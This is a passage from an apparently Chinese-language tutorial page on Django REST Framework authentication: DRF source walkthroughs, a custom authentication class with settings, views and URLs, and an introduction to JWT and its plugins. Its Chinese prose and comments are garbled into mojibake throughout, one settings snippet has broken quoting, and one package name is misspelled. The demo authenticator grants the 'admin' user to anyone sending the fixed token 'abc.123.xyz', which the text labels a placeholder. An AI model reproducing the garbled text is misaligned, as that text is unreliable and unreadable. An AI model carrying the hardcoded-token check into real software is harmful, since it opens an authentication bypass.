self.perform_authentication(request)  <span class="comment">#ËÆ§ËØÅ</span></span><br><span class="line">        self.check_permissions(request)  <span class="comment">#ÊùÉÈôê</span></span><br><span class="line">        self.check_throttles(request)  <span class="comment">#È¢ëÁéá</span></span><br></pre></td></tr></table></figure><h2 id="rest_framework.views.apiview.perform_authentication">rest_framework.views.APIView.perform_authentication()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perform_authentication</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Perform authentication on the incoming request.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Note that if you override this and simply 'pass', then authentication</span></span><br><span class="line"><span class="string">        will instead be performed lazily, the first time either</span></span><br><span class="line"><span class="string">        `request.user` or `request.auth` is accessed.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        request.user</span><br></pre></td></tr></table></figure><h2 id="rest_framework.request.request.user">rest_framework.request.Request.user</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns the user associated with the current request, as authenticated</span></span><br><span class="line"><span class="string">    by the authentication classes provided to the request.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(self, <span class="string">'_user'</span>):</span><br><span class="line">        <span class="keyword">with</span> wrap_attributeerrors():</span><br><span class="line">            self._authenticate()</span><br><span class="line">    <span class="keyword">return</span> self._user</span><br></pre></td></tr></table></figure><h2 id="rest_framework.request.request._authenticate">rest_framework.request.Request._authenticate()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÂÅöËÆ§ËØÅ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_authenticate</span><span class="params">(self)</span>:</span>  <span class="comment">#ËøôÈáåÁöÑselfÂ∞±ÊòØrequest</span></span><br><span class="line">    <span class="comment"># ÈÅçÂéÜÊãøÂà∞‰∏Ä‰∏™‰∏™ËÆ§ËØÅÂô®ÔºåËøõË°åËÆ§ËØÅ</span></span><br><span class="line">    <span class="comment"># self.authenticatorsÈÖçÁΩÆÁöÑ‰∏ÄÂ†ÜËÆ§ËØÅÁ±ª‰∫ßÁîüÁöÑËÆ§ËØÅÁ±ªÂØπË±°ÁªÑÊàêÁöÑ list</span></span><br><span class="line">„ÄÄ„ÄÄ„ÄÄ„ÄÄ <span class="comment"># Âç≥Ôºö[auth() for auth in self.authentication_classes]</span></span><br><span class="line">    <span class="keyword">for</span> authenticator <span class="keyword">in</span> self.authenticators:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ËÆ§ËØÅÂô®(ÂØπË±°)Ë∞ÉÁî®ËÆ§ËØÅÊñπÊ≥ïauthenticate(ËÆ§ËØÅÁ±ªÂØπË±°self, requestËØ∑Ê±ÇÂØπË±°)</span></span><br><span class="line">            <span class="comment"># ËøîÂõûÂÄºÔºöÁôªÈôÜÁöÑÁî®Êà∑‰∏éËÆ§ËØÅÁöÑ‰ø°ÊÅØÁªÑÊàêÁöÑ tuple</span></span><br><span class="line">            <span class="comment"># ËØ•ÊñπÊ≥ïË¢´tryÂåÖË£πÔºå‰ª£Ë°®ËØ•ÊñπÊ≥ï‰ºöÊäõÂºÇÂ∏∏ÔºåÊäõÂºÇÂ∏∏Â∞±‰ª£Ë°®ËÆ§ËØÅÂ§±Ë¥•</span></span><br><span class="line">            user_auth_tuple = authenticator.authenticate(self)</span><br><span class="line">        <span class="keyword">except</span> exceptions.APIException:</span><br><span class="line">            self._not_authenticated()</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ËøîÂõûÂÄºÁöÑÂ§ÑÁêÜ</span></span><br><span class="line">        <span class="keyword">if</span> user_auth_tuple <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._authenticator = authenticator</span><br><span class="line">            <span class="comment"># Â¶Ç‰ΩïÊúâËøîÂõûÂÄºÔºåÂ∞±Â∞Ü ÁôªÈôÜÁî®Êà∑ ‰∏é ÁôªÈôÜËÆ§ËØÅ ÂàÜÂà´‰øùÂ≠òÂà∞ request.user„ÄÅrequest.auth</span></span><br><span class="line">            self.user, self.auth = user_auth_tuple</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># Â¶ÇÊûúËøîÂõûÂÄºuser_auth_tuple‰∏∫Á©∫Ôºå‰ª£Ë°®ËÆ§ËØÅÈÄöËøáÔºå‰ΩÜÊòØÊ≤°Êúâ ÁôªÈôÜÁî®Êà∑ ‰∏é ÁôªÈôÜËÆ§ËØÅ‰ø°ÊÅØÔºå‰ª£Ë°®Ê∏∏ÂÆ¢</span></span><br><span class="line">    self._not_authenticated()</span><br></pre></td></tr></table></figure><h1 id="Ëá™ÂÆö‰πâËÆ§ËØÅÁ±ª">Ëá™ÂÆö‰πâËÆ§ËØÅÁ±ª</h1><div class="note warning"><p>ËÆ§ËØÅÁªÑ‰ª∂‰∏ÄËà¨ÈÉΩÊòØËá™ÂÆö‰πâÁöÑÔºå‰∏ç‰ºö‰ΩøÁî®ÂéüÂßãÁöÑ</p></div><h2 id="ÊñπÊ≥ï">ÊñπÊ≥ï</h2><p>‰ªéÊ∫êÁ†ÅÁöÑ<code>settings</code>Êñá‰ª∂ÂèØ‰ª•ÁúãÂá∫ÔºåËÆ§ËØÅÁ±ªÈúÄË¶ÅÁªßÊâø<code>BasicAuthentication</code>(Âú®authentication.pyÊñá‰ª∂)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_AUTHENTICATION_CLASSES<span class="string">': [</span></span><br><span class="line"><span class="string">    '</span>rest_framework.authentication.SessionAuthentication<span class="string">',  #‰ºöÈáçÊñ∞ÂºÄÂêØCSRFËÆ§ËØÅ</span></span><br><span class="line"><span class="string">    '</span>rest_framework.authentication.BasicAuthentication<span class="string">'</span></span><br><span class="line"><span class="string">]</span></span><br></pre></td></tr></table></figure><p>ÂÖ∑‰ΩìÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p><ol type="1"><li>ÂàõÂª∫ÁªßÊâø<code>BaseAuthentication</code>ÁöÑËÆ§ËØÅÁ±ª</li><li>ÈáçÂÜô<code>authenticate</code>ÊñπÊ≥ï</li><li>ÂÆûÁé∞‰ΩìÊ†πÊçÆËÆ§ËØÅËßÑÂàô Á°ÆÂÆöÊ∏∏ÂÆ¢„ÄÅÈùûÊ≥ïÁî®Êà∑„ÄÅÂêàÊ≥ïÁî®Êà∑ ÔºàÊ†πÊçÆËá™Â∑±ÁöÑËÆ§ËØÅËßÑÂàôÔºâ<ul><li>Ê≤°ÊúâËÆ§ËØÅ‰ø°ÊÅØËøîÂõû<code>None</code>(Ê∏∏ÂÆ¢)</li><li>ÊúâËÆ§ËØÅ‰ø°ÊÅØËÆ§ËØÅÂ§±Ë¥•ÊäõÂºÇÂ∏∏(ÈùûÊ≥ïÁî®Êà∑)</li><li>ÊúâËÆ§ËØÅ‰ø°ÊÅØËÆ§ËØÅÊàêÂäüËøîÂõûÁî®Êà∑‰∏éËÆ§ËØÅ‰ø°ÊÅØÂÖÉÁªÑ(ÂêàÊ≥ïÁî®Êà∑)</li></ul></li><li>ËøõË°åÂÖ®Â±ÄÊàñÂ±ÄÈÉ®ÈÖçÁΩÆ</li></ol><h2 id="Á§∫‰æã‰ª£Á†Å">Á§∫‰æã‰ª£Á†Å</h2><h3 id="models.py">models.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(AbstractUser)</span>:</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>,unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'user'</span></span><br><span class="line">        verbose_name = <span class="string">'Áî®Êà∑Ë°®'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.username</span><br></pre></td></tr></table></figure><h3 id="utils.authentications.py">utils.authentications.py</h3><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1ÔºâÁªßÊâøBaseAuthenticationÁ±ª</span></span><br><span class="line"><span class="comment"># 2ÔºâÈáçÂÜôauthenticate(self, request)ÊñπÊ≥ïÔºåËá™ÂÆö‰πâËÆ§ËØÅËßÑÂàô</span></span><br><span class="line"><span class="comment"># 3ÔºâËá™ÂÆö‰πâËÆ§ËØÅËßÑÂàôÂü∫‰∫éÁöÑÊù°‰ª∂Ôºö</span></span><br><span class="line"><span class="comment">#       Ê≤°ÊúâËÆ§ËØÅ‰ø°ÊÅØËøîÂõûNone(Ê∏∏ÂÆ¢)</span></span><br><span class="line"><span class="comment">#       ÊúâËÆ§ËØÅ‰ø°ÊÅØËÆ§ËØÅÂ§±Ë¥•ÊäõÂºÇÂ∏∏(ÈùûÊ≥ïÁî®Êà∑)</span></span><br><span class="line"><span class="comment">#       ÊúâËÆ§ËØÅ‰ø°ÊÅØËÆ§ËØÅÊàêÂäüËøîÂõûÁî®Êà∑‰∏éËÆ§ËØÅ‰ø°ÊÅØÂÖÉÁªÑ(ÂêàÊ≥ïÁî®Êà∑)</span></span><br><span class="line"><span class="comment"># 4ÔºâÂÆåÂÖ®ËßÜÂõæÁ±ªÁöÑÂÖ®Â±Ä(settingsÊñá‰ª∂‰∏≠)ÊàñÂ±ÄÈÉ®(Á°ÆÂàáÁöÑËßÜÂõæÁ±ª)ÈÖçÁΩÆ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> BaseAuthentication</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> AuthenticationFailed   <span class="comment">#ÂºÇÂ∏∏Êé•Êî∂</span></span><br><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment">#ÁªßÊâøBaseAuthentication</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyAuthentication</span><span class="params">(BaseAuthentication)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        ÂêåÂâçÂè∞ËØ∑Ê±ÇÂ§¥ÊãøËÆ§ËØÅ‰ø°ÊÅØauthÔºàËé∑ÂèñËÆ§ËØÅÁöÑÂ≠óÊÆµË¶Å‰∏éÂâçÂè∞Á∫¶ÂÆöÔºâ</span></span><br><span class="line"><span class="string">        Ê≤°ÊúâauthÊòØÊ∏∏ÂÆ¢ÔºåËøîÂõûNone</span></span><br><span class="line"><span class="string">        ÊúâauthËøõË°åÊ†°È™å</span></span><br><span class="line"><span class="string">            Â§±Ë¥•ÊòØÈùûÊ≥ïÁî®Êà∑ÔºåÊäõÂá∫ÂºÇÂ∏∏</span></span><br><span class="line"><span class="string">            ÊàêÂäüÊòØÂêàÊ≥ïÁî®Êà∑ÔºåËøîÂõû (Áî®Êà∑, ËÆ§ËØÅ‰ø°ÊÅØ)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">authenticate</span><span class="params">(self, request)</span>:</span>   <span class="comment">#ÈáçÂÜôauthenticateÊñπÊ≥ï</span></span><br><span class="line">„ÄÄ„ÄÄ„ÄÄ„ÄÄ<span class="comment">#ÂâçÂè∞Âú®ËØ∑Ê±ÇÂ§¥Êê∫Â∏¶ËÆ§ËØÅ‰ø°ÊÅØÔºå</span></span><br><span class="line">„ÄÄ„ÄÄ„ÄÄ„ÄÄ<span class="comment">#‰∏îÈªòËÆ§ËßÑËåÉÁî® Authorization Â≠óÊÆµÊê∫Â∏¶ËÆ§ËØÅ‰ø°ÊÅØÔºå</span></span><br><span class="line">„ÄÄ„ÄÄ„ÄÄ„ÄÄ<span class="comment">#ÂêéÂè∞Âõ∫ÂÆöÂú®ËØ∑Ê±ÇÂØπË±°ÁöÑMETAÂ≠óÊÆµ‰∏≠ HTTP_AUTHORIZATION Ëé∑Âèñ</span></span><br><span class="line">        <span class="comment">#ËÆ§ËØÅ‰ø°ÊÅØauth</span></span><br><span class="line">        auth = request.META.get(<span class="string">'HTTP_AUTHORIZATION'</span>,<span class="literal">None</span>)<span class="comment">#Â§ÑÁêÜÊ∏∏ÂÆ¢</span></span><br><span class="line">        <span class="keyword">if</span> auth <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#ËÆæÁΩÆËÆ§ËØÅÂ≠óÊÆµÂ∞èËßÑÂàô(‰∏§ÊÆµÂºè):"auth ËÆ§ËØÅÂ≠óÁ¨¶‰∏≤" Âú®BasicAuthenticationÁ±ª‰∏≠ÊúâËßÑÂàôËåÉÂºè</span></span><br><span class="line">        auth_list = auth.split()     <span class="comment">#Ê†°È™åÊòØÂê¶ËøòÊòØÈùûÊ≥ïÁî®Êà∑,‰∏çÊòØ‰∏§ÊÆµÔºåÁ¨¨‰∏ÄÊÆµ‰∏çÊòØauthÂ∞±ÊòØÈùûÊ≥ïÁî®Êà∑</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (len(auth_list) == <span class="number">2</span> <span class="keyword">and</span> auth_list[<span class="number">0</span>].lower() == <span class="string">'auth'</span>):</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'ËÆ§ËØÅ‰ø°ÊÅØÊúâËØØÔºåÈùûÊ≥ïÁî®Êà∑'</span>)  <span class="comment">#ÊäõÂºÇÂ∏∏</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Ê†°È™åËÆ§ËØÅ‰ø°ÊÅØÁ¨¨‰∫åÊÆµ‰ªéauth_list[1]‰∏≠Ëß£ÊûêÂá∫Êù•</span></span><br><span class="line">        <span class="comment"># Ê≥®ÔºöÂÅáËÆæ‰∏ÄÁßçÊÉÖÂÜµÔºå‰ø°ÊÅØ‰∏∫abc.123.xyzÔºåÂ∞±ÂèØ‰ª•Ëß£ÊûêÂá∫adminÁî®Êà∑ÔºõÂÆûÈôÖÂºÄÂèëÔºåËØ•ÈÄªËæë‰∏ÄÂÆöÊòØÊ†°È™åÁî®Êà∑ÁöÑÊ≠£Â∏∏ÈÄªËæë</span></span><br><span class="line">        <span class="keyword">if</span> auth_list[<span class="number">1</span>] != <span class="string">'abc.123.xyz'</span>: <span class="comment">#Ê†°È™åÂ§±Ë¥•</span></span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'‰ø°ÊÅØÈîôËØØÔºåÈùûÊ≥ïÁî®Êà∑'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#ÊúÄÂêéÂÜçÂéªÊï∞ÊçÆÂ∫ìÊ†°È™åÊòØÂê¶ÊúâÊ≠§Áî®Êà∑</span></span><br><span class="line">        user = models.User.objects.filter(username=<span class="string">'admin'</span>).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'Áî®Êà∑Êï∞ÊçÆÊúâËØØÔºåÈùûÊ≥ïÁî®Êà∑'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (user,<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></details><h3 id="settings.py">settings.py</h3><p>Âú®<code>settings</code>Êñá‰ª∂‰∏≠ÈÖçÁΩÆËá™ÂÆö‰πâËÆ§ËØÅÁªÑ‰ª∂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># ËÆ§ËØÅÁ±ªÈÖçÁΩÆ</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="views.py">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># Â¶ÇÊûúÈÄöËøá‰∫ÜËÆ§ËØÅÁªÑ‰ª∂Ôºårequest.userÂ∞±‰∏ÄÂÆöÊúâÂÄº</span></span><br><span class="line">        <span class="comment"># Ê∏∏ÂÆ¢ÔºöAnonymousUser</span></span><br><span class="line">        <span class="comment"># Áî®Êà∑ÔºöUserË°®‰∏≠ÁöÑÂÖ∑‰ΩìÁî®Êà∑ÂØπË±°</span></span><br><span class="line">        print(request.user)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'test get ok'</span>)</span><br></pre></td></tr></table></figure><h3 id="urls.py">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'test/'</span>, views.TestAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="postmanÊµãËØï">PostmanÊµãËØï</h2><p>‰ΩøÁî®PostmanÁöÑgetËØ∑Ê±ÇÔºåÂú®Ëá™ÂÆö‰πâËÆ§ËØÅÁªÑ‰ª∂Ëé∑ÂèñÁî®Êà∑ÔºåÂú®viewsËßÜÂõæÈÄöËøá<code>request.user</code>ËÉΩÊâìÂç∞Âá∫Êù•</p><h1 id="tokenËÆ§ËØÅ">TokenËÆ§ËØÅ</h1><h2 id="jwt">JWT</h2><p>RESTful APIÈáå‰ΩøÁî®ÊúÄÊôÆÈÅçÁöÑÂ∞±ÊòØÂü∫‰∫éjsonÁöÑtokenËÆ§ËØÅ‰∫ÜÔºåÂç≥Json Web TokenÔºàJWTÔºâ„ÄÇJWT ÊòØ‰∏Ä‰∏™ÂºÄÊîæÊ†áÂáÜ(RFC 7519)ÔºåÂÆÉÂÆö‰πâ‰∫Ü‰∏ÄÁßçÁî®‰∫éÁÆÄÊ¥ÅÔºåËá™ÂåÖÂê´ÁöÑÁî®‰∫éÈÄö‰ø°ÂèåÊñπ‰πãÈó¥‰ª• JSON ÂØπË±°ÁöÑÂΩ¢ÂºèÂÆâÂÖ®‰º†ÈÄí‰ø°ÊÅØÁöÑÊñπÊ≥ï„ÄÇJWT ÂèØ‰ª•‰ΩøÁî® HMAC ÁÆóÊ≥ïÊàñËÄÖÊòØ RSA ÁöÑÂÖ¨Èí•ÂØÜÈí•ÂØπËøõË°åÁ≠æÂêç„ÄÇ</p><h3 id="‰ºòÁÇπ">‰ºòÁÇπ</h3><ol type="1"><li>ÊúçÂä°Âô®‰∏çË¶ÅÂ≠òÂÇ®tokenÔºåtoken‰∫§ÁªôÊØè‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØËá™Â∑±Â≠òÂÇ®ÔºåÊúçÂä°Âô®ÂéãÂäõÂ∞è</li><li>ÊúçÂä°Âô®Â≠òÂÇ®ÁöÑÊòØ Á≠æÂèëÂíåÊ†°È™åtoken ‰∏§ÊÆµÁÆóÊ≥ïÔºåÁ≠æÂèëËÆ§ËØÅÁöÑÊïàÁéáÈ´ò</li><li>ÁÆóÊ≥ïÂÆåÊàêÂêÑÈõÜÁæ§ÊúçÂä°Âô®ÂêåÊ≠•ÊàêÊú¨‰ΩéÔºåË∑ØÁî±È°πÁõÆÂÆåÊàêÈõÜÁæ§ÈÉ®ÁΩ≤ÔºàÈÄÇÂ∫îÈ´òÂπ∂ÂèëÔºâ</li></ol><h3 id="jwtÊ†ºÂºè">JWTÊ†ºÂºè</h3><ol type="1"><li>jwt tokenÈááÁî®‰∏âÊÆµÂºèÔºöÂ§¥ÈÉ®.ËΩΩËç∑.Á≠æÂêç</li><li>ÊØè‰∏ÄÈÉ®ÂàÜÈÉΩÊòØ‰∏Ä‰∏™jsonÂ≠óÂÖ∏Âä†ÂØÜÂΩ¢ÂèÇÁöÑÂ≠óÁ¨¶‰∏≤</li><li>Â§¥ÈÉ®ÂíåËΩΩËç∑ÈááÁî®ÁöÑÊòØbase64ÂèØÈÄÜÂä†ÂØÜÔºàÂâçÂè∞ÂêéÂè∞ÈÉΩÂèØ‰ª•Ëß£ÂØÜÔºâ</li><li>Á≠æÂêçÈááÁî®hash256‰∏çÂèØÈÄÜÂä†ÂØÜÔºàÂêéÂè∞Ê†°È™åÈááÁî®Á¢∞ÊíûÊ†°È™åÔºâ</li><li>ÂêÑÈÉ®ÂàÜÂ≠óÂÖ∏ÁöÑÂÜÖÂÆπÔºö<ul><li>Â§¥ÈÉ®ÔºöÂü∫Á°Ä‰ø°ÊÅØ - ÂÖ¨Âè∏‰ø°ÊÅØ„ÄÅÈ°πÁõÆÁªÑ‰ø°ÊÅØ„ÄÅÂèØÈÄÜÂä†ÂØÜÈááÁî®ÁöÑÁÆóÊ≥ï</li><li>ËΩΩËç∑ÔºöÊúâÁî®‰ΩÜÈùûÁßÅÂØÜÁöÑ‰ø°ÊÅØ - Áî®Êà∑ÂèØÂÖ¨ÂºÄ‰ø°ÊÅØ„ÄÅËøáÊúüÊó∂Èó¥</li><li>Á≠æÂêçÔºöÂ§¥ÈÉ®+ËΩΩËç∑+ÁßòÈí• ‰∏çÂèØÈÄÜÂä†ÂØÜÂêéÁöÑÁªìÊûú</li><li>Ê≥®ÔºöÊúçÂä°Âô®jwtÁ≠æÂêçÂä†ÂØÜÁßòÈí•‰∏ÄÂÆö‰∏çËÉΩÊ≥ÑÈú≤</li></ul></li></ol><h3 id="Á≠æÂèë‰∏éÊ†°È™å">Á≠æÂèë‰∏éÊ†°È™å</h3><ul><li>Á≠æÂèëtokenÔºöÂõ∫ÂÆöÁöÑÂ§¥ÈÉ®‰ø°ÊÅØÂä†ÂØÜ„ÄÇÂΩìÂâçÁöÑÁôªÈôÜÁî®Êà∑‰∏éËøáÊúüÊó∂Èó¥Âä†ÂØÜ„ÄÇÂ§¥ÈÉ®+ËΩΩËç∑+ÁßòÈí•ÁîüÊàê‰∏çÂèØÈÄÜÂä†ÂØÜ</li><li>Ê†°È™åtokenÔºöÂ§¥ÈÉ®ÂèØÊ†°È™å‰πüÂèØ‰ª•‰∏çÊ†°È™åÔºåËΩΩËç∑Ê†°È™åÂá∫Áî®Êà∑‰∏éËøáÊúüÊó∂Èó¥ÔºåÂ§¥ÈÉ®+ËΩΩËç∑+ÁßòÈí•ÂÆåÊàêÁ¢∞ÊíûÊ£ÄÊµãÊ†°È™åtokenÊòØÂê¶Ë¢´ÁØ°Êîπ</li></ul><h2 id="drfËá™Â∏¶ÁöÑjwtËÆ§ËØÅ">DRFËá™Â∏¶ÁöÑJWTËÆ§ËØÅ</h2><p>DRFÁöÑÊ∫êÁ†ÅÈáåÊòØÂÆûÁé∞‰∫ÜtokenËÆ§ËØÅÊ®°Âùó‰∫ÜÁöÑÔºå‰∏çËøáÂ≠òÂú®<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDIzZjQzZGYyNjVkYTFiY2MxOTY3NDkjaGVhZGluZy03">‰∏Ä‰∫õ‰∏çË∂≥<i class="fa fa-external-link-alt"></i></span>ÔºåÂõ†Ê≠§‰∏ÄËà¨‰∏çÊé®Ëçê‰ΩøÁî®„ÄÇ</p><p>‰∏ÄËà¨‰ΩøÁî®ÁöÑÊòØDRFÁöÑ‰∏§‰∏™jwtÊèí‰ª∂Ôºö</p><ul><li><code>jango-rest-framework-jwt</code>: ÊõæÁªèÂæàÂ∏∏Áî®Ôºå‰ΩÜÂêéÊù•‰ΩúËÄÖÂ∑≤‰∏çÂÜçÁª¥Êä§ÔºåÂõ†Ê≠§‰πü‰∏çÊé®Ëçê‰ΩøÁî®</li><li><code>django-rest-framework-simplejwt</code>: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvYXV0aGVudGljYXRpb24vI2pzb24td2ViLXRva2VuLWF1dGhlbnRpY2F0aW9u">DRFÂÆòÊñπÊñáÊ°£<i class="fa fa-external-link-alt"></i></span>Êé®Ëçê‰ΩøÁî®ÁöÑÊèí‰ª∂</li></ul><h2 id="drfÊèí‰ª∂-django-rest-framework-jwt">DRFÊèí‰ª∂ django-rest-framework-jwt</h2><p>Á§∫‰æã‰ª£Á†ÅÂ¶Ç‰∏ã</p><h3 id="settings.py-1">settings.py</h3><div class="note warning"><p>Ê≠§Â§ÑËÆæÁΩÆÁöÑÊòØÂÖ®Â±ÄÈÖçÁΩÆ</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># ËÆ§ËØÅÁ±ªÈÖçÁΩÆ</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">        <span class="string">'rest_framework_jwt.authentication.JSONWebTokenAuthentication'</span>, <span class="comment"># jwtÂÖ®Â±ÄÈÖçÁΩÆ</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="models.py-1">models.py</h3><p>‰ª£Á†ÅÂêå‰∏ä</p><h3 